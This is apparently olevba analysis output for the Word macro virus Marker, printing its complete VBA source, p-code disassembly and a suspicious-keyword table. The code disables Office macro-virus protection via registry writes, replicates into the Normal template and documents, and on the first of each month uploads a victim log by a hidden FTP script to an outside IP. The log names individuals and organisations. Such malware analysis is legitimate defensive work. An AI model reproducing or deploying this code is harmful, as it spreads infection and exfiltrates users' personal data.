olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub DisableAV()
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Check"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Whoa"
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
End Sub
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is another marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogUploaded As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    Randomize
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsfx" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = True
  ElseIf Day(Now()) <> 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 10:19:17  - Freitag, 11 Dez 1998
' SPo0Ky
' Blue Planet
'



' 10:50:20  - Tuesday, 5 Jan 1999
' Queensland TAFE
'



' 08:12:46  - Friday, 15 Jan 1999
' cpitty
'



' 09:18:52  - Tuesday, 19 Jan 1999
' Dr. Suresh Hungenahally
'



' 09:30:46  - Friday, 29 Jan 1999
' Jenny
'



' 10:41:42  - Monday, 1 Feb 1999
' David Neyle
'



' 09:20:10 AM - Wednesday, 3 Feb 1999
' Jim Musumeci
'



' 12:38:14  - Thursday, 11 Feb 1999
' Aristocrat Leisure Industries
'



' 08:23:59  - Tuesday, 16 Feb 1999
' Aristocrat Leisure Industries
'



' 01:33:05  - Wednesday, 17 Mar 1999
' J.Brian Cooper
'



' 10:36:33 AM - Wednesday, 24 Mar 1999
' jhalvy
'



' 08:16:35 AM - Monday, 29 Mar 1999
' bbishop
'



' 12:25:29  - âòîðíèê, 4 ìàé 1999
' Mike Pavluschick
'



' 03:09:04 PM - Tuesday, 27 Feb 2001
' Tester
'



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.l
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10696 bytes
' Line #0:
' 	FuncDefn (Public Sub DisableAV())
' Line #1:
' 	LitStr 0x0005 "Check"
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0058 "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #3:
' 	LitStr 0x0004 "Whoa"
' 	LitStr 0x0000 ""
' 	LitStr 0x0047 "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #4:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options"
' 	LitStr 0x0014 "MacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0055 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options"
' 	LitStr 0x0014 "MacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #6:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0044 "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options"
' 	LitStr 0x0014 "MacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Private Sub Document_Close())
' Line #9:
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' Line #12:
' 	Dim (Const) 
' 	LitStr 0x001A "<- this is another marker!"
' 	VarDefn Marker
' Line #13:
' Line #14:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #15:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #16:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #17:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogUploaded (As String)
' Line #18:
' Line #19:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #22:
' Line #23:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #24:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #25:
' Line #26:
' Line #27:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #29:
' Line #30:
' Line #31:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000B "LogUploaded"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #32:
' Line #33:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #35:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #40:
' Line #41:
' 	ArgsCall Read 0x0000 
' Line #42:
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #44:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	LitStr 0x0007 "C:\hsfx"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #47:
' Line #48:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #51:
' Line #52:
' 	LitStr 0x000D "c:\netldx.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #61:
' Line #62:
' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netldx.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #63:
' Line #64:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000B "LogUploaded"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #65:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	ElseIfBlock 
' Line #66:
' 	LitVarSpecial (False)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000B "LogUploaded"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #67:
' 	EndIfBlock 
' Line #68:
' Line #69:
' Line #70:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #71:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #72:
' Line #73:
' Line #74:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #75:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #76:
' Line #77:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #78:
' Line #79:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #80:
' Line #81:
' Line #82:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #83:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #84:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #85:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #86:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	ElseBlock 
' Line #89:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #92:
' Line #93:
' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #94:
' Line #95:
' Line #96:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #97:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #98:
' Line #99:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #100:
' Line #101:
' 	EndIfBlock 
' Line #102:
' Line #103:
' Line #104:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #105:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #106:
' Line #107:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #108:
' Line #109:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #110:
' Line #111:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #112:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #113:
' Line #114:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #115:
' Line #116:
' 	EndIfBlock 
' Line #117:
' Line #118:
' Line #119:
' 	EndIfBlock 
' Line #120:
' Line #121:
' 	EndSub 
' Line #122:
' Line #123:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #124:
' Line #125:
' 	QuoteRem 0x0000 0x0021 " 10:19:17  - Freitag, 11 Dez 1998"
' Line #126:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #127:
' 	QuoteRem 0x0000 0x000C " Blue Planet"
' Line #128:
' 	QuoteRem 0x0000 0x0000 ""
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' 	QuoteRem 0x0000 0x0020 " 10:50:20  - Tuesday, 5 Jan 1999"
' Line #133:
' 	QuoteRem 0x0000 0x0010 " Queensland TAFE"
' Line #134:
' 	QuoteRem 0x0000 0x0000 ""
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' 	QuoteRem 0x0000 0x0020 " 08:12:46  - Friday, 15 Jan 1999"
' Line #139:
' 	QuoteRem 0x0000 0x0007 " cpitty"
' Line #140:
' 	QuoteRem 0x0000 0x0000 ""
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' 	QuoteRem 0x0000 0x0021 " 09:18:52  - Tuesday, 19 Jan 1999"
' Line #145:
' 	QuoteRem 0x0000 0x0018 " Dr. Suresh Hungenahally"
' Line #146:
' 	QuoteRem 0x0000 0x0000 ""
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' 	QuoteRem 0x0000 0x0020 " 09:30:46  - Friday, 29 Jan 1999"
' Line #151:
' 	QuoteRem 0x0000 0x0006 " Jenny"
' Line #152:
' 	QuoteRem 0x0000 0x0000 ""
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' 	QuoteRem 0x0000 0x001F " 10:41:42  - Monday, 1 Feb 1999"
' Line #157:
' 	QuoteRem 0x0000 0x000C " David Neyle"
' Line #158:
' 	QuoteRem 0x0000 0x0000 ""
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' 	QuoteRem 0x0000 0x0024 " 09:20:10 AM - Wednesday, 3 Feb 1999"
' Line #163:
' 	QuoteRem 0x0000 0x000D " Jim Musumeci"
' Line #164:
' 	QuoteRem 0x0000 0x0000 ""
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' 	QuoteRem 0x0000 0x0022 " 12:38:14  - Thursday, 11 Feb 1999"
' Line #169:
' 	QuoteRem 0x0000 0x001E " Aristocrat Leisure Industries"
' Line #170:
' 	QuoteRem 0x0000 0x0000 ""
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' 	QuoteRem 0x0000 0x0021 " 08:23:59  - Tuesday, 16 Feb 1999"
' Line #175:
' 	QuoteRem 0x0000 0x001E " Aristocrat Leisure Industries"
' Line #176:
' 	QuoteRem 0x0000 0x0000 ""
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' 	QuoteRem 0x0000 0x0023 " 01:33:05  - Wednesday, 17 Mar 1999"
' Line #181:
' 	QuoteRem 0x0000 0x000F " J.Brian Cooper"
' Line #182:
' 	QuoteRem 0x0000 0x0000 ""
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' 	QuoteRem 0x0000 0x0025 " 10:36:33 AM - Wednesday, 24 Mar 1999"
' Line #187:
' 	QuoteRem 0x0000 0x0007 " jhalvy"
' Line #188:
' 	QuoteRem 0x0000 0x0000 ""
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' 	QuoteRem 0x0000 0x0022 " 08:16:35 AM - Monday, 29 Mar 1999"
' Line #193:
' 	QuoteRem 0x0000 0x0008 " bbishop"
' Line #194:
' 	QuoteRem 0x0000 0x0000 ""
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' 	QuoteRem 0x0000 0x0020 " 12:25:29  - âòîðíèê, 4 ìàé 1999"
' Line #199:
' 	QuoteRem 0x0000 0x0011 " Mike Pavluschick"
' Line #200:
' 	QuoteRem 0x0000 0x0000 ""
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' 	QuoteRem 0x0000 0x0023 " 03:09:04 PM - Tuesday, 27 Feb 2001"
' Line #205:
' 	QuoteRem 0x0000 0x0007 " Tester"
' Line #206:
' 	QuoteRem 0x0000 0x0000 ""
' Line #207:
' Line #208:
' Line #209:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

